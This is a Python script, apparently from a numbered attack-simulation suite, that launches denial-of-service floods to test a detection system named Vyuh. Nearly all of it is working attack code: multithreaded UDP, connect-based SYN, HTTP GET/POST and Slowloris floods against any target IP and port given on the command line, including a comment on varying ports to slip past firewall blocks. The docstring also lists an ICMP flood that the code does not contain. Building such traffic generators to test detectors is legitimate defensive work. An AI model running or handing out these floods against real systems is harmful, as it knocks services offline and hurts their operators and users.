"""
06_ddos_dos.py — DDoS / DoS Attack Simulation
==============================================
Simulates multiple DoS/DDoS attack patterns:
  - SYN flood (TCP — half-open connections)
  - UDP flood (volumetric — random UDP packets)
  - HTTP flood (Layer 7 — GET/POST request storm)
  - Slowloris (slow HTTP connection exhaustion)
  - ICMP flood (ping flood via raw sockets — requires admin/root)

Vyuh should detect:
  - Traffic volume anomaly / rate spike
  - SYN without ACK (incomplete TCP handshakes)
  - High connection rate from single source
  - Bandwidth saturation events

Usage:
    python 06_ddos_dos.py
    python 06_ddos_dos.py --type udp --target 192.168.1.100 --port 80 --duration 30
    python 06_ddos_dos.py --type http --threads 20
    python 06_ddos_dos.py --type all
"""

import socket
import threading
import time
import argparse
import logging
import random
import string
import struct
import os
import sys
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
import config

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(config.LOG_FILE, mode="a"),
    ]
)
log = logging.getLogger("ddos_dos")

BANNER = """
╔══════════════════════════════════════════════════╗
║    Vyuh Attack Sim — 06 DDoS / DoS FLOOD         ║
╚══════════════════════════════════════════════════╝
"""

# ── Shared stats ──────────────────────────────────────────────────────────────
stats_lock   = threading.Lock()
total_sent   = 0
total_failed = 0
stop_event   = threading.Event()


def increment_sent():
    global total_sent
    with stats_lock:
        total_sent += 1


def increment_failed():
    global total_failed
    with stats_lock:
        total_failed += 1


def stats_printer(duration: float, attack_type: str):
    """Background thread that prints live stats."""
    start = time.time()
    while not stop_event.is_set():
        elapsed  = time.time() - start
        pct      = min((elapsed / duration) * 100, 100) if duration > 0 else 0
        width    = 30
        filled   = int(width * pct / 100)
        bar      = "█" * filled + "░" * (width - filled)
        rate     = total_sent / elapsed if elapsed > 0 else 0
        print(f"\r  [{bar}] {pct:.0f}%  Sent: {total_sent:>7,} | "
              f"Failed: {total_failed:>4,} | Rate: {rate:>8.0f}/s  ", end="", flush=True)
        time.sleep(0.5)
        if elapsed >= duration:
            break
    print()


# ── UDP Flood ─────────────────────────────────────────────────────────────────
def udp_flood_worker(target: str, port: int, packet_size: int, tid: int):
    """
    Continuously send UDP datagrams to target:port.
    Volumetric attack — overwhelms bandwidth / UDP processing.
    """
    payload = os.urandom(packet_size)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            while not stop_event.is_set():
                try:
                    # Vary the port slightly to avoid easy firewall block
                    dst_port = port if port > 0 else random.randint(1024, 65535)
                    s.sendto(payload, (target, dst_port))
                    increment_sent()
                except Exception:
                    increment_failed()
    except Exception as e:
        log.debug(f"UDP worker {tid} error: {e}")


def udp_flood(target: str, port: int, duration: float, threads: int,
               packet_size: int):
    print(f"\n  🌊 UDP FLOOD → {target}:{port}")
    print(f"     Threads: {threads} | Duration: {duration}s | Packet: {packet_size}B")
    log.info(f"UDP flood started: {target}:{port} | {threads} threads | {duration}s")

    worker_threads = []
    for i in range(threads):
        t = threading.Thread(target=udp_flood_worker,
                             args=(target, port, packet_size, i), daemon=True)
        t.start()
        worker_threads.append(t)

    sp = threading.Thread(target=stats_printer, args=(duration, "UDP"), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    sp.join(timeout=2)


# ── TCP SYN Flood ──────────────────────────────────────────────────────────────
def syn_flood_worker(target: str, port: int, tid: int):
    """
    TCP SYN flood using connect() — not raw sockets.
    Opens TCP connections and immediately drops them (half-open simulation).
    Note: True SYN flood with spoofed IPs requires raw sockets + root.
    """
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((target, port))
            # Don't complete handshake — just close immediately
            s.close()
            increment_sent()
        except Exception:
            increment_failed()


def syn_flood(target: str, port: int, duration: float, threads: int):
    print(f"\n  ⚡ SYN FLOOD (TCP) → {target}:{port}")
    print(f"     Threads: {threads} | Duration: {duration}s")
    log.info(f"SYN flood started: {target}:{port} | {threads} threads | {duration}s")

    worker_threads = []
    for i in range(threads):
        t = threading.Thread(target=syn_flood_worker,
                             args=(target, port, i), daemon=True)
        t.start()
        worker_threads.append(t)

    sp = threading.Thread(target=stats_printer, args=(duration, "SYN"), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    sp.join(timeout=2)


# ── HTTP Flood (Layer 7) ──────────────────────────────────────────────────────
def http_flood_worker(target: str, port: int, tid: int):
    """
    HTTP GET/POST flood — Layer 7 application-level DoS.
    Generates many complete HTTP requests to exhaust web server resources.
    """
    paths = ["/", "/index.html", "/api/v1/data", "/search?q=test",
             "/login", "/admin", "/static/main.js", "/images/logo.png"]
    methods = ["GET", "POST"]
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "curl/7.79.1",
        "python-requests/2.26.0",
    ]

    while not stop_event.is_set():
        try:
            path   = random.choice(paths)
            method = random.choice(methods)
            ua     = random.choice(ua_list)

            # Build raw HTTP request
            if method == "POST":
                body    = "data=" + "A" * random.randint(100, 1000)
                request = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                    f"{body}"
                ).encode()
            else:
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                ).encode()

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((target, port))
                s.sendall(request)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
            increment_sent()
        except Exception:
            increment_failed()


def http_flood(target: str, port: int, duration: float, threads: int):
    print(f"\n  🌐 HTTP FLOOD (L7) → {target}:{port}")
    print(f"     Threads: {threads} | Duration: {duration}s")
    log.info(f"HTTP flood started: {target}:{port} | {threads} threads | {duration}s")

    worker_threads = []
    for i in range(threads):
        t = threading.Thread(target=http_flood_worker,
                             args=(target, port, i), daemon=True)
        t.start()
        worker_threads.append(t)

    sp = threading.Thread(target=stats_printer, args=(duration, "HTTP"), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    sp.join(timeout=2)


# ── Slowloris ─────────────────────────────────────────────────────────────────
def slowloris_worker(target: str, port: int, tid: int):
    """
    Slowloris: open many HTTP connections and keep them alive by sending
    partial headers very slowly — exhausts the server's connection pool.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))

        # Send incomplete HTTP request headers
        s.sendall(
            f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"User-Agent: Mozilla/5.0\r\n".encode()
        )
        increment_sent()

        # Keep sending partial headers to maintain the connection
        while not stop_event.is_set():
            try:
                s.sendall(f"X-Header-{random.randint(0, 9999)}: {random.randint(0, 9999)}\r\n".encode())
                time.sleep(random.uniform(5, 15))
            except Exception:
                break
        s.close()
    except Exception:
        increment_failed()


def slowloris(target: str, port: int, duration: float, threads: int):
    print(f"\n  🐢 SLOWLORIS → {target}:{port}")
    print(f"     Sockets: {threads} | Duration: {duration}s")
    log.info(f"Slowloris started: {target}:{port} | {threads} sockets | {duration}s")

    for i in range(threads):
        t = threading.Thread(target=slowloris_worker,
                             args=(target, port, i), daemon=True)
        t.start()
        time.sleep(0.1)  # Stagger connection opens

    sp = threading.Thread(target=stats_printer, args=(duration, "Slowloris"), daemon=True)
    sp.start()
    time.sleep(duration)
    stop_event.set()
    sp.join(timeout=2)


# ── Report ────────────────────────────────────────────────────────────────────
def print_report(attack_type: str, duration: float):
    rate = total_sent / duration if duration > 0 else 0
    print("\n" + "═" * 55)
    print(f"  DoS REPORT — {attack_type.upper()}")
    print("═" * 55)
    print(f"  Duration      : {duration:.1f}s")
    print(f"  Packets/reqs sent  : {total_sent:,}")
    print(f"  Failures       : {total_failed:,}")
    print(f"  Rate           : {rate:,.0f} pkt/s")
    print(f"  Bandwidth est. : ~{rate * config.DDOS_PACKET_SIZE / 1024:.1f} KB/s")
    print("═" * 55)
    log.info(f"DoS complete: {attack_type} | {total_sent} sent | {rate:.0f}/s")


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="DDoS/DoS Simulation — Vyuh")
    parser.add_argument("--target",   default=config.DDOS_TARGET_IP,      help="Target IP")
    parser.add_argument("--port",     default=config.DDOS_TARGET_PORT, type=int, help="Target port")
    parser.add_argument("--type",     default="udp",
                        choices=["udp", "syn", "http", "slowloris", "all"],
                        help="Flood type")
    parser.add_argument("--duration", default=config.DDOS_DURATION, type=float, help="Duration (s)")
    parser.add_argument("--threads",  default=config.DDOS_THREADS, type=int,    help="Thread count")
    parser.add_argument("--pkt-size", default=config.DDOS_PACKET_SIZE, type=int, help="UDP packet size")
    args = parser.parse_args()

    print(f"  Target     : {args.target}:{args.port}")
    print(f"  Attack     : {args.type.upper()}")
    print(f"  Duration   : {args.duration}s")
    print(f"  Threads    : {args.threads}")

    attack_types = [args.type] if args.type != "all" else ["udp", "syn", "http", "slowloris"]

    for attack in attack_types:
        # Reset stats for each attack type
        global total_sent, total_failed
        total_sent   = 0
        total_failed = 0
        stop_event.clear()

        start = datetime.now()
        log.info(f"=== {attack.upper()} flood starting at {start} ===")

        if attack == "udp":
            udp_flood(args.target, args.port, args.duration, args.threads, args.pkt_size)
        elif attack == "syn":
            syn_flood(args.target, args.port, args.duration, args.threads)
        elif attack == "http":
            http_flood(args.target, args.port, args.duration, args.threads)
        elif attack == "slowloris":
            slowloris(args.target, args.port, args.duration, args.threads)

        print_report(attack, args.duration)

        if args.type == "all" and attack != attack_types[-1]:
            print(f"\n  Waiting 5s before next attack type...\n")
            stop_event.clear()
            time.sleep(5)


if __name__ == "__main__":
    main()
